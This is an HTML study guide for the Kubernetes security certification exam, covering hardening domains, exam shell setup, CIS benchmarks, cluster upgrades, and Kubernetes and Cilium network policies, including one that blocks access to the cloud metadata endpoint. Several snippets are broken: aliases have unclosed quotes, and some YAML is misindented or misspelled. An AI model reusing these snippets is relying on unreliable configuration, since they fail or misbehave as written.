<h3 id="cluster-setup-10"><a class="header" href="#cluster-setup-10">Cluster Setup (10%)</a></h3>
<ul>
<li>
<p>Use Network security policies to restrict cluster level access</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/services-networking/network-policies/">Kubernetes Documentation &gt; Concepts &gt; Services, Load Balancing, and Networking &gt; Network Policies</a></li>
</ul>
</li>
<li>
<p>Use CIS benchmark to review the security configuration of Kubernetes components (etcd, kubelet, kubedns, kubeapi)</p>
<ul>
<li><a href="https://www.cisecurity.org/benchmark/kubernetes">CIS Security &gt; Securing Kubernetes</a></li>
<li><a href="https://www.aquasec.com/cloud-native-academy/kubernetes-in-production/kubernetes-cis-benchmark-best-practices-in-brief/">Cloud Native Wiki - CIS Benchmark Best Practices</a></li>
<li><a href="https://github.com/aquasecurity/kube-bench">GitHub &gt; Aqua Security &gt; kube-bench</a></li>
</ul>
</li>
<li>
<p>Properly set up Ingress objects with security control</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/services-networking/ingress/#tls">Kubernetes Documentation &gt; Concepts &gt; Services, Load Balancing, and Networking &gt; Ingress &gt; TLS</a></li>
</ul>
</li>
<li>
<p>Protect node metadata and endpoints</p>
<ul>
<li>
<p><a href="https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/#restricting-cloud-metadata-api-access">Kubernetes Documentation &gt; Tasks &gt; Administer a Cluster &gt; Securing a Cluster</a></p>
<pre><code class="language-yaml"># all pods in namespace cannot access metadata endpoint
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
name: cloud-metadata-deny
namespace: default
spec:
podSelector: {}
policyTypes:
- Egress
egress:
- to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32
</code></pre>
</li>
</ul>
</li>
<li>
<p>Minimize use of, and access to, GUI elements</p>
<ul>
<li><a href="https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/#accessing-the-dashboard-ui">Kubernetes Documentation &gt; Tasks &gt; Access Applications in a Cluster &gt; Deploy and Access the Kubernetes Dashboard</a></li>
</ul>
</li>
<li>
<p>Verify platform binaries before deploying</p>
<ul>
<li>
<p><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">Kubernetes Documentation &gt; Tasks &gt; Install Tools &gt; Install and Set Up kubectl on Linux</a></p>
<blockquote>
<p>Note: Check the step 2 - validate binary</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h3 id="cluster-hardening-15"><a class="header" href="#cluster-hardening-15">Cluster Hardening (15%)</a></h3>
<ul>
<li>
<p>Restrict access to Kubernetes API</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/security/controlling-access/">Kubernetes Documentation &gt; Concepts &gt; Security &gt; Controlling Access to the Kubernetes API</a></li>
</ul>
</li>
<li>
<p>Use Role Based Access Controls to minimize exposure</p>
<ul>
<li><a href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/">Kubernetes Documentation &gt; Reference &gt; API Access Control &gt; Using RBAC Authorization</a></li>
</ul>
</li>
<li>
<p>Exercise caution in using service accounts e.g. disable defaults, minimize permissions on newly created ones</p>
<ul>
<li><a href="https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/">Kubernetes Documentation &gt; Reference &gt; API Access Control &gt; Managing Service Accounts</a></li>
</ul>
</li>
<li>
<p>Update Kubernetes frequently</p>
<ul>
<li><a href="https://kubernetes.io/docs/tasks/administer-cluster/cluster-upgrade/">Kubernetes Documentation &gt; Tasks &gt; Administer a Cluster &gt; Upgrade A Cluster</a></li>
</ul>
</li>
</ul>
<h3 id="system-hardening-15"><a class="header" href="#system-hardening-15">System Hardening (15%)</a></h3>
<ul>
<li>
<p>Minimize host OS footprint (reduce attack surface)</p>
<ul>
<li>Remove unnecessary packages</li>
<li>Identify and address open ports</li>
<li>Shut down any unnecessary services</li>
</ul>
</li>
<li>
<p>Minimize IAM roles</p>
<ul>
<li><a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html">AWS &gt; Security best practices in IAM</a></li>
<li><a href="https://cloud.google.com/iam/docs/using-iam-securely">GCP - Using IAM securely</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices">Azure &gt; Best practices for Azure RBAC</a></li>
</ul>
</li>
<li>
<p>Minimize external access to the network</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/services-networking/network-policies/">Kubernetes Documentation &gt; Concepts &gt; Services, Load Balancing, and Networking &gt; Network Policies</a></li>
</ul>
</li>
<li>
<p>Appropriately use kernel hardening tools such as AppArmor, seccomp</p>
<ul>
<li><a href="https://kubernetes.io/docs/tutorials/security/apparmor/">Kubernetes Documentation &gt; Tutorials &gt; Security &gt; Restrict a Container‚Äôs Access to Resources with AppArmor</a></li>
<li><a href="https://kubernetes.io/docs/tutorials/security/seccomp/">Kubernetes Documentation &gt; Tutorials &gt; Security &gt; Restrict a Container‚Äôs Syscalls with seccomp</a></li>
<li><a href="https://gitlab.com/apparmor/apparmor/-/wikis/Documentation">AppArmor Documentation</a></li>
</ul>
</li>
</ul>
<h3 id="minimize-microservice-vulnerabilities-20"><a class="header" href="#minimize-microservice-vulnerabilities-20">Minimize Microservice Vulnerabilities (20%)</a></h3>
<ul>
<li>
<p>Setup appropriate OS level security domains e.g. using PSP, OPA, security contexts</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/security/pod-security-policy/#what-is-a-pod-security-policy">Kubernetes Documentation &gt; Concepts &gt; Security &gt; Pod Security Policies</a></li>
<li><a href="https://kubernetes.io/blog/2019/08/06/opa-gatekeeper-policy-and-governance-for-kubernetes/">Kubernetes Blog &gt; OPA Gatekeeper: Policy and Governance for Kubernetes</a></li>
<li><a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/">Kubernetes Documentation &gt; Tasks &gt; Configure Pods and &gt; Containers &gt; Configure a Security Context for a Pod or Container</a></li>
</ul>
</li>
<li>
<p>Manage kubernetes secrets</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/configuration/secret/">Kubernetes Documentation &gt; Concepts &gt; Configuration &gt; Secrets</a></li>
</ul>
</li>
<li>
<p>Use container runtime sandboxes in multi-tenant environments (e.g. gvisor, kata containers</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/security/pod-security-standards/#what-about-sandboxed-pods">Kubernetes Documentation &gt; Concepts &gt; Security &gt; Pod Security Standards</a></li>
<li><a href="https://kubernetes.io/docs/concepts/containers/runtime-class/">Kubernetes Documentation &gt; Concepts &gt; Containers &gt; Runtime Class</a></li>
<li><a href="https://gvisor.dev/docs/user_guide/quick_start/kubernetes/">gvisor</a></li>
<li><a href="https://katacontainers.io/">kata containers</a></li>
</ul>
</li>
<li>
<p>Implement pod to pod encryption by use of mTLS</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/services-networking/ingress/#tls">Kubernetes Documentation &gt; Concepts &gt; Services, Load Balancing, and Networking &gt; Ingress &gt; TLS</a></li>
</ul>
</li>
</ul>
<h3 id="supply-chain-security-20"><a class="header" href="#supply-chain-security-20">Supply Chain Security (20%)</a></h3>
<ul>
<li>
<p>Minimize base image footprint</p>
<ul>
<li>Remove exploitable and non-sssential software</li>
<li>Use multi-stage Dockerfiles to keep software compilation out of runtime images</li>
<li>Never bake any secrets into your images</li>
<li>Image scanning</li>
</ul>
</li>
<li>
<p>Secure your supply chain: whitelist allowed image registries, sign and validate images</p>
<ul>
<li><a href="https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#imagepolicywebhook">Kubernetes Documentation &gt; Reference &gt; API Access Control &gt; Using Admission Controllers &gt; ImagePolicyWebhook</a></li>
</ul>
</li>
<li>
<p>Use static analysis of user workloads (e.g. kubernetes resources, docker files)</p>
<ul>
<li>Secure base images</li>
<li>Remove unnecessary packages</li>
<li>Stop containers from using elevated privileges</li>
</ul>
</li>
<li>
<p>Scan images for known vulnerabilities</p>
<ul>
<li><a href="https://github.com/aquasecurity/trivy">Trivy</a></li>
</ul>
</li>
</ul>
<h3 id="monitoring-logging-and-runtime-security-20"><a class="header" href="#monitoring-logging-and-runtime-security-20">Monitoring, Logging and Runtime Security (20%)</a></h3>
<ul>
<li>
<p>Perform behavioral analytics of syscall process and file activities at the host and container level to detect malicious activities</p>
<ul>
<li><a href="https://falco.org/docs/">Falco</a></li>
</ul>
</li>
<li>
<p>Detect threats within physical infrastructure, apps, networks, data, users and workloads</p>
</li>
<li>
<p>Detect all phases of attack regardless where it occurs and how it spreads</p>
<ul>
<li><a href="https://cloud.redhat.com/blog/protecting-kubernetes-against-mitre-attck-initial-access">Protecting Kubernetes Against MITRE ATT&amp;CK</a></li>
</ul>
</li>
<li>
<p>Perform deep analytical investigation and identification of bad actors within environment</p>
<ul>
<li><a href="https://kubernetes.io/docs/tasks/debug-application-cluster/audit/">Kubernetes Documentation &gt; Tasks &gt; Monitoring, Logging, and Debugging &gt;Auditing</a></li>
</ul>
</li>
<li>
<p>Ensure immutability of containers at runtime</p>
<ul>
<li>
<p><a href="https://kubernetes.io/docs/concepts/containers/">Kubernetes Documentation &gt; Concepts &gt; Containers</a></p>
</li>
<li>
<p><a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/">Kubernetes Documentation &gt; Tasks &gt; Configure Pods and &gt; Containers &gt; Configure a Security Context for a Pod or Container</a></p>
<blockquote>
<p><code>readOnlyRootFilesystem</code>: Mounts the container‚Äôs root filesystem as read-only</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Use Audit Logs to monitor access</p>
<ul>
<li><a href="https://kubernetes.io/docs/tasks/debug-application-cluster/audit/">Kubernetes Documentation &gt; Tasks &gt; Monitoring, Logging, and Debugging &gt;Auditing</a></li>
</ul>
</li>
</ul>
<h3 id="changes"><a class="header" href="#changes">Changes</a></h3>
<ul>
<li>https://kodekloud.com/blog/cks-exam-updates-2024-your-complete-guide-to-certification-with-kodekloud/</li>
<li>https://training.linuxfoundation.org/cks-program-changes/</li>
</ul>
<h3 id="software--environment"><a class="header" href="#software--environment">Software / Environment</a></h3>
<blockquote>
<p>As of 11/2024</p>
</blockquote>
<ul>
<li>Kubernetes version: 1.31</li>
<li>Ubuntu 20.04</li>
<li>Terminal
<ul>
<li>Bash</li>
</ul>
</li>
<li>Tools available
<ul>
<li><code>vim</code> - Text/Code editor</li>
<li><code>tmux</code> - Terminal multiplexor</li>
<li><code>jq</code> - Working with JSON format</li>
<li><code>yq</code> - Working with YAML format</li>
<li><code>firefox</code> - Web Browser for accessing K8s docs</li>
<li><code>base64</code> - Tool to convert to and from base 64</li>
<li><code>kubectl</code> - Kubernetes CLI Client</li>
<li>more typical linux tools like <code>grep</code>, <code>wc</code> ‚Ä¶</li>
</ul>
</li>
<li>3rd Party Tools to know
<ul>
<li><code>tracee</code></li>
<li><code>OPA Gatekeeper</code></li>
<li><code>kubebench</code></li>
<li><code>syft</code></li>
<li><code>grype</code></li>
<li><code>kube-linter</code></li>
<li><code>kubesec</code></li>
<li><code>trivy</code></li>
<li><code>falco</code></li>
</ul>
</li>
</ul>
<h3 id="exam-environment-setup"><a class="header" href="#exam-environment-setup">Exam Environment Setup</a></h3>
<h4 id="terminal-shortcutsaliases"><a class="header" href="#terminal-shortcutsaliases">Terminal Shortcuts/Aliases</a></h4>
<p>The following are useful terminal shortcut aliases/shortcuts to use during the exam.</p>
<p>Add the following to the end of <code>~/.bashrc</code> file:</p>
<pre><code>alias k='kubectl # &lt;-- Most general and useful shortcut!

alias kd='kubectl delete --force --grace-period=0 # &lt;-- Fast deletion of resources

alias kc="kubectl create" # &lt;-- Create a resource
alias kc-dry='kubectl create --dry-run=client -o yaml # &lt;-- Create a YAML template of resource

alias kr='kubectl run' # &lt;-- Run/Create a resource (typically pod)
alias kr-dry='kubectl run --dry-run=client -o yaml # &lt;-- Create a YAML template of resource

# If kc-dry and kr-dry do not autocomplete, add the following

export do="dry-run=client -o yaml" # &lt;-- Create the YAML tamplate (usage: $do)
</code></pre>
<p>The following are some example usages:</p>
<pre><code>k get nodes -o wide
kc deploymentmy my-dep --image=nginx --replicas=3
kr-dry my-pod --image=nginx --command sleep 36000
kr-dry --image=busybox -- "/bin/sh" "-c" "sleep 36000"
kr --image=busybox -- "/bin/sh" "-c" "sleep 36000" $do
</code></pre>
<h4 id="terminal-command-completion"><a class="header" href="#terminal-command-completion">Terminal Command Completion</a></h4>
<p>The following is useful so that you can use the TAB key to auto-complete a command, allowing you to
not always have to remember the exact keyword or spelling.</p>
<p>Type the following into the terminal:</p>
<pre><code>- kubectl completion bash &gt;&gt; ~/.bashrc`-`kubectl` command completion
- kubeadm completion bash &gt;&gt; ~/.bashrc`-`kubeadm` command completion
- exec $SHELL` - Reload shell to enable all added completion
</code></pre>
<h4 id="vim"><a class="header" href="#vim">VIM</a></h4>
<p>The exam will have VIM or nano terminal text editor tools available. If you are using
VIM ensure that you create a <code>~/.vimrc</code> file and add the following:</p>
<pre><code>set ts=2 " &lt;-- tabstop - how many spaces is \t worth
set sw=2 " &lt;-- shiftwidth - how many spaces is indentation
set et " &lt;-- expandtab - Use spaces, never \t values
set mouse=a " &lt;-- Enable mouse support
</code></pre>
<p>Or simply:</p>
<pre><code>set ts=2 sw=2 et mouse=a
</code></pre>
<p>Also know VIM basics are as follows. Maybe a good idea to take a quick VIM course.</p>
<ul>
<li><code>vim my-file.yaml</code> - If file exists, open it, else create it for editing</li>
<li><code>:w</code> - Save</li>
<li><code>:x</code> - Save and exit</li>
<li><code>:q</code> - Exit</li>
<li><code>:q!</code> - Exit without saving</li>
<li><code>i</code> - Insert mode, regular text editor mode</li>
<li><code>v</code> - Visual mode for selection</li>
<li><code>ESC</code> - Normal mode</li>
</ul>
<h4 id="pasting-text-into-vim"><a class="header" href="#pasting-text-into-vim">Pasting Text Into VIM</a></h4>
<p>Often times you will want to paste text or code from the Kubernetes documentation into
into a VIM terminal. If you simply do that, the tabs will do funky things.</p>
<p>Do the following inside VIM before pasting your copied text:</p>
<ol>
<li>In NORMAL mode, type <code>:set paste</code></li>
<li>Now enter <code>INSERT</code> mode</li>
</ol>
<ul>
<li>You should see ‚Äì <code>INSERT (paste) --</code> at the bottom of the screen</li>
</ul>
<ol start="3">
<li>Paste the text</li>
</ol>
<ul>
<li>You can right click with mouse and select Paste or <code>CTRL + SHIFT + v</code></li>
</ul>
<h4 id="tmux"><a class="header" href="#tmux">tmux</a></h4>
<p><code>tmux</code> will allow you to use multiple terminal windows in one (aka terminal multiplexing).
Make sure you know the basics for tmux usage:</p>
<ul>
<li><code>tmux</code>- Turn and enter<code>tmux</code></li>
<li><code>CTRL + b "</code> - Split the window vertically (line is horizontal)</li>
<li><code>CTRL + b %</code> - Split the window horizontally (line is vertical)</li>
<li><code>CTRL + b &lt;ARROW KEY&gt;</code> - Switch between window panes</li>
<li><code>CTRL + b (hold) &lt;ARROW KEY&gt;</code> - Resize current window pane</li>
<li><code>CTRL + b z</code> - Toggle full terminal/screen a pane (good for looking at a full document)</li>
<li><code>CTRL + d</code>or<code>exit</code> - Close a window pane</li>
</ul>
<h4 id="mouse-support"><a class="header" href="#mouse-support">Mouse Support</a></h4>
<p>If you want to be able to click and select within tmux and tmux panes, you can also enable
mouse support. This can be useful.</p>
<p>These steps must be done outside of tmux`</p>
<ol>
<li>
<p>Create a <code>.tmux.conf</code> file and edit it</p>
<ul>
<li><code>vim ~/.tmux.conf</code></li>
</ul>
</li>
<li>
<p>Add the configuration, save, and exit file</p>
<ul>
<li><code>set -g mouse on</code></li>
</ul>
</li>
<li>
<p>Reload tmux configuration</p>
<ul>
<li><code>tmux source .tmux.conf</code></li>
</ul>
</li>
</ol>
<h1 id="preparation"><a class="header" href="#preparation">Preparation</a></h1>
<h3 id="study-resources"><a class="header" href="#study-resources">Study Resources</a></h3>
<ul>
<li><a href="https://kubernetes.io/docs/home/">Official Kubernetes Documentation</a></li>
<li><a href="https://learn.kodekloud.com/user/courses/certified-kubernetes-security-specialist-cks">KodeKloud CKS Course</a></li>
<li><a href="https://www.amazon.com/Kubernetes-Book-Nigel-Poulton/dp/1521823634">The Kubernetes Book - Nigel Poulton</a></li>
<li><a href="https://www.amazon.com/Certified-Kubernetes-Security-Specialist-Depth/dp/1098132971">CKS Study Guide</a></li>
<li><a href="https://killer.sh/">killer.sh</a> labs</li>
</ul>
<h3 id="practice"><a class="header" href="#practice">Practice</a></h3>
<ul>
<li><a href="https://labs.play-with-k8s.com/">Play with Kubernetes</a></li>
<li><a href="https://killer.sh/cks">killer.sh Practice questions and environment</a></li>
</ul>
<h1 id="fundamentals"><a class="header" href="#fundamentals">Fundamentals</a></h1>
<ul>
<li>You should already have CKA level knowledge</li>
<li>Linux Kernel Namespaces isolate containers
<ul>
<li>PID Namespace: Isolates processes</li>
<li>Mount Namespace: Restricts access to mounts or root filesystem</li>
<li>Network Namespace: Only access certain network devices. Firewall and routing rules</li>
<li>User Namespace: Different set of UIDs are used. Example: User (UID 0) inside one namespace can be different from user(UID 0) inside another namespace</li>
</ul>
</li>
<li>cgroups restrict resource usage of processes
<ul>
<li>RAM/Disk/CPU</li>
</ul>
</li>
<li>Using cgroups and linux kernel namespaces, we can create containers</li>
</ul>
<h1 id="understand-the-kubernetes-attack-surface"><a class="header" href="#understand-the-kubernetes-attack-surface">Understand the Kubernetes Attack Surface</a></h1>
<ul>
<li>Kubernetes is a complex system with many components. Each component has its own vulnerabilities and attack vectors.</li>
<li>The attack surface can be reduced by:
<ul>
<li>Using network policies to restrict traffic between pods</li>
<li>Using RBAC to restrict access to the kube-api server</li>
<li>Using admission controllers to enforce security policies</li>
<li>Using pod security standards to enforce security policies</li>
<li>Using best practices to secure the underlying infrastructure</li>
<li>Using securityContext to enforce security policies for pods</li>
</ul>
</li>
</ul>
<h1 id="the-4-cs-of-cloud-native-security"><a class="header" href="#the-4-cs-of-cloud-native-security">The 4 C‚Äôs of Cloud-Native Security</a></h1>
<ul>
<li>Cloud: Security of the cloud infrastructure</li>
<li>Cluster: Security of the cluster itself</li>
<li>Container: Security of the containers themselves</li>
<li>Code: Security of the code itself</li>
</ul>
<h1 id="1-cluster-setup"><a class="header" href="#1-cluster-setup">1 Cluster Setup</a></h1>
<h2 id="cis-benchmark"><a class="header" href="#cis-benchmark">CIS Benchmark</a></h2>
<h3 id="what-is-a-security-benchmark"><a class="header" href="#what-is-a-security-benchmark">What is a security benchmark?</a></h3>
<ul>
<li>A security benchmark is a set of standard benchmarks that define a state of optimized security for a given system (servers, network devices, etc.)</li>
<li>CIS (Center for Internet Security) provides standardized benchmarks (in the form of downloadable files) that one can use to implement security on their system.</li>
<li>CIS provides benchmarks for public clouds (Azure, AWS, GCP, etc.), operating systems (Linux, Windows, MacOS), network devices (Cisco, Juniper, HP, etc.), mobile devices (Android and Apple), desktop and server software (such as Kubernetes)</li>
<li>View more info <a href="https://www.cisecurity.org/cis-benchmarks">here</a></li>
<li>You must register at the CIS website to download benchmarks</li>
<li>Each benchmark provides a description of a vulnerability, as well as a path to resolution.</li>
<li>CIS-CAT is a tool you can run on a system to generate recommendations for a given system. There are two versions available for download, CIS-CAT Lite and CIS-CAT Pro. The Lite version only includes benchmarks for Windows 10, MacOS, Ubuntu, and desktop software (Google Chrome, etc.). The Pro version includes all benchmarks.</li>
<li>CIS Benchmarks for Kubernetes
<ul>
<li>Register at the CIS website and download the CIS Benchmarks for <a href="https://www.cisecurity.org/benchmark/kubernetes">kubernetes</a></li>
<li>Includes security benchmarks for master and worker nodes</li>
</ul>
</li>
</ul>
<h3 id="kubebench"><a class="header" href="#kubebench">KubeBench</a></h3>
<ul>
<li>KubeBench is an alternative to CIS-CAT Pro to run benchmarks against a Kubernetes cluster.</li>
<li>KubeBench is open source and maintained by Aqua Security</li>
<li>KubeBench can be deployed as a Docker container or a pod. It can also be invoked directly from the binaries or compiled from source.</li>
<li>Once run, kube-bench will scan the cluster to identify if best-practices have been implemented. If will output a report specifying which benchmarks have passed/failed. It will tell you how to fix any failed benchmarks.</li>
<li>You can view the report by tailing the pod logs of the kube-bench pod.</li>
</ul>
<h2 id="cluster-upgrades"><a class="header" href="#cluster-upgrades">Cluster Upgrades</a></h2>
<ul>
<li>The controller-manager and kube-scheduler can be one minor revision behind the API server.
<ul>
<li>For example, if the API server is at version 1.10, controller-manager and kube-scheduler can be at 1.9 or 1.10</li>
</ul>
</li>
<li>The kubelet and kube-proxy can be up to 2 minor revisions behind the API server</li>
<li>kubectl can be x+1 or x-1 minor revisions from the kube API server</li>
<li>You can upgrade the cluster one minor version at a time</li>
</ul>
<h3 id="upgrade-process"><a class="header" href="#upgrade-process">Upgrade Process</a></h3>
<ul>
<li>Drain and cordon the node before upgrading it
<ul>
<li><code>kubectl drain &lt;node name&gt; --ignore-daemonsets</code></li>
</ul>
</li>
<li>Upgrade the master node first.</li>
<li>Upgrade worker nodes after the master node.</li>
</ul>
<h3 id="upgrading-with-kubeadm"><a class="header" href="#upgrading-with-kubeadm">Upgrading with Kubeadm</a></h3>
<ul>
<li>If the cluster was created with kubeadm, you can use kubeadm to upgrade it.</li>
<li>The upgrade process with kubeadm:
<pre><code># Increase the minor version in the apt repository file for kubernetes:
  sudo vi /etc/apt/sources.list.d/kubernetes.list

# Determine which version to upgrade to
  sudo apt update
  sudo apt-cache madison kubeadm

# Upgrade kubeadm first
  sudo apt-mark unhold kubeadm &amp;&amp; \
  sudo apt-get update &amp;&amp; sudo apt-get install -y kubeadm='1.31.x-*' &amp;&amp; \
  sudo apt-mark hold kubeadm

# Verify the version of kubeadm
  kubeadm version

# Check the kubeadm upgrade plan
  sudo kubeadm upgrade plan

# Apply the upgrade plan
  sudo kubeadm upgrade apply v1.31.x

# Upgrade the nodes
  sudo kubeadm upgrade node

# Upgrade kubelet and kubectl
  sudo apt-mark unhold kubelet kubectl &amp;&amp; \
  sudo apt-get update &amp;&amp; sudo apt-get install -y kubelet='1.31.x-*' kubectl='1.31.x-*' &amp;&amp; \
  sudo apt-mark hold kubelet kubectl

# Restart the kubelet
  sudo systemctl daemon-reload
  sudo systemctl restart kubelet
</code></pre>
</li>
</ul>
<h2 id="network-policies"><a class="header" href="#network-policies">Network Policies</a></h2>
<h3 id="overview-9"><a class="header" href="#overview-9">Overview</a></h3>
<ul>
<li>
<p>Kubernetes Network Policies allow you to control the flow of traffic to and from pods. They define rules that specify:</p>
<ul>
<li>What traffic is allowed to reach a set of pods.</li>
<li>What traffic a set of pods can send out.</li>
</ul>
</li>
<li>
<p>Pods can communicate with each other by default. Network Policies allow you to restrict this communication.</p>
</li>
<li>
<p>Network Policies operate at Layer 3 and Layer 4 (IP and TCP/UDP). They do not cover Layer 7 (application layer).</p>
</li>
<li>
<p>Network Policies are additive. Meaning, to grant more permissions for network communication, simply create another network policy with more fine-grained rules.</p>
</li>
<li>
<p>Network Policies are implemented by the network plugin. The network plugin must support NetworkPolicy for the policies to take effect.</p>
</li>
<li>
<p>Network Policies are namespace-scoped. They apply to pods in the same namespace.</p>
<pre><code>apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: 
  name: default-deny-all
  namespace: secure-namespace
spec:
    podSelector: {}
    policyTypes
    - Ingress
</code></pre>
</li>
<li>
<p>Say we now want to grant the ‚Äòfrontend‚Äô pods with label ‚Äòteir: frontend‚Äô in the ‚Äòapp‚Äô namespace access to the ‚Äòbackend‚Äô pods in ‚Äòsecure-namespace‚Äô. We can do that by creating another Network Policy like this:</p>
<pre><code>apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-app-pods
  namespace: secure-namespace
spec:
    podSelector:
      matchLabels:
        tier: backend
    policyTypes:
    - Ingress
    ingress:
    - from:
      - namespaceSelector:
          matchLabels:
            name: app
        podSelector:
          matchLabels:
            teir: frontend
      ports:
      - protocol: TCP
        port: 3000

</code></pre>
</li>
</ul>
<h3 id="key-concepts-1"><a class="header" href="#key-concepts-1">Key Concepts</a></h3>
<ol>
<li><strong>Namespace Scope</strong>: Network policies are applied at the namespace level.</li>
<li><strong>Selector-Based Rules</strong>:
<ul>
<li><strong>Pod Selector</strong>: Select pods the policy applies to.</li>
<li><strong>Namespace Selector</strong>: Select pods based on their namespace.</li>
</ul>
</li>
<li><strong>Traffic Direction</strong>:
<ul>
<li><strong>Ingress</strong>: Traffic coming into the pod.</li>
<li><strong>Egress</strong>: Traffic leaving the pod.</li>
</ul>
</li>
<li><strong>Default Behavior</strong>:
<ul>
<li>Pods are non-isolated by default (accept all traffic).</li>
<li>A pod becomes isolated when a network policy matches it.</li>
</ul>
</li>
</ol>
<h3 id="common-fields-in-a-network-policy"><a class="header" href="#common-fields-in-a-network-policy">Common Fields in a Network Policy</a></h3>
<ul>
<li><strong><code>podSelector</code></strong>: Specifies the pods the policy applies to.</li>
<li><strong><code>ingress</code>/<code>egress</code></strong>: Lists rules for ingress or egress traffic.</li>
<li><strong><code>from</code>/<code>to</code></strong>: Specifies allowed sources/destinations (can use IP blocks, pod selectors, or namespace selectors).</li>
<li><strong><code>ports</code></strong>: Specifies allowed ports and protocols.</li>
</ul>
<h3 id="example-network-policies"><a class="header" href="#example-network-policies">Example Network Policies</a></h3>
<h4 id="allow-all-ingress-traffic"><a class="header" href="#allow-all-ingress-traffic">Allow All Ingress Traffic</a></h4>
<pre><code>````
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-all-ingress
  namespace: default
spec:
  podSelector: {}
  ingress:
  - {}
```
</code></pre>
<h4 id="deny-all-ingress-and-egress-traffic"><a class="header" href="#deny-all-ingress-and-egress-traffic">Deny All Ingress and Egress Traffic</a></h4>
<pre><code>````
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
    name: deny-all
    namespace: defaulT
spec:
    podSelector: {}
    ingress: []
    egress: []

```
</code></pre>
<h4 id="allow-specific-ingress-from-a-namespace"><a class="header" href="#allow-specific-ingress-from-a-namespace">Allow Specific Ingress from a Namespace</a></h4>
<pre><code>```
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
    name: allow-namespace-ingress
    namespace: default
spec:
    podSelector:
        matchLabels:
            app: my-app
    ingress:
    - from:
      - namespaceSelector:
        matchLabels:
        team: frontend
```
</code></pre>
<h4 id="allow-egress-to-a-specific-ip"><a class="header" href="#allow-egress-to-a-specific-ip">Allow Egress to a Specific IP</a></h4>
<pre><code>```
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
    name: allow-egress-specific-ip
    namespace: default
spec:
    podSelector:
        matchLabels:
            app: my-app
    egress:
    - to:
      - ipBlock:
        cidr: 192.168.1.0/24
        ports:
      - protocol: TCP
        port: 8080
```
</code></pre>
<h2 id="cilium-network-policy"><a class="header" href="#cilium-network-policy">Cilium Network Policy</a></h2>
<ul>
<li>Cilium Network Policies provide more granularity, flexibility, and features than traditional Kubernetes Network Policies</li>
<li>Cilium Network Policies operate up to layer 7 of the OSI model. Traditional Network Policies only operate up to layer 4.</li>
<li>Cilium Network Policies perform well due to the fact that they use eBPF</li>
<li>Hubble allows you to watch traffic going to and from pods</li>
<li>You can add Cilium to the cluster by:
<ul>
<li>Deploying with helm</li>
<li>Running <code>cilium install</code> after you install the cilium CLI tool</li>
</ul>
</li>
</ul>
<h3 id="cilium-network-policy-structure"><a class="header" href="#cilium-network-policy-structure">Cilium Network Policy Structure</a></h3>
<ul>
<li>Cilium Network Policies are defined in YAML files</li>
<li>The structure is similar to Kubernetes Network Policies</li>
</ul>
<h3 id="layer-3-rules"><a class="header" href="#layer-3-rules">Layer 3 Rules</a></h3>
<ul>
<li>Endpoints Based - Apply the policy to pods based on Kubernetes label selectors</li>
<li>Services Based - Apply the policy based on kubernetes services, controlling traffic based on service names rather than individual pods</li>
<li>Entities Based - Cilium has pre-defined entities like cluster, host, and world. This type of policy uses these entities to determine what traffic the policy is applied to.
<ul>
<li>Cluster - Represents all kubernetes endpoints
<ul>
<li>Example:
<pre><code>apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-egress-to-cluster-resources
spec:
  endpointSelector: {}
  egress:
  - toEntities:
    - cluster
</code></pre>
</li>
</ul>
</li>
<li>World - Represents any external traffic, but not cluster traffic
<pre><code>apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-egress-to-external-resources
spec:
  endpointSelector: {}
  egress:
  - toEntities:
    - world
</code></pre>
</li>
<li>Host - Represents the local kubernetes node</li>
<li>Remote-node - Represents traffic from a remote node</li>
<li>All - Represents all endpoints both internal and external to the cluster
<pre><code>apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-egress-to-external-resources
spec:
  endpointSelector: {}
  egress:
  - toEntities:
    - all
</code></pre>
</li>
</ul>
</li>
<li>Node Based - Apply the policy based on nodes in the cluster</li>
<li>IP/CIDR Based - Apply the policy based on IP addresses or CIDR blocks</li>
</ul>
<h3 id="layer-4-rules"><a class="header" href="#layer-4-rules">Layer 4 Rules</a></h3>
<ul>
<li>If no layer 4 rules are defined, all traffic is allowed for layer 4</li>
<li>Example:
<pre><code>  apiVersion: "cilium.io/v2"
  kind: CiliumNetworkPolicy
  metadata:
    name: allow-external-80
  spec:
    endpointSelector:
      matchLabels:
        run: curl
    egress:
      - toPorts:
        - ports:
          - port: "80"
            protocol: TCP
</code></pre>
</li>
</ul>
<h3 id="layer-7-rules"><a class="header" href="#layer-7-rules">Layer 7 Rules</a></h3>
<h3 id="deny-policies"><a class="header" href="#deny-policies">Deny Policies</a></h3>
<ul>
<li>You can create deny policies to explicitly block traffic</li>
<li>Deny policies take higher precedence over allow policies</li>
<li>ingressDeny Example:
<pre><code>apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
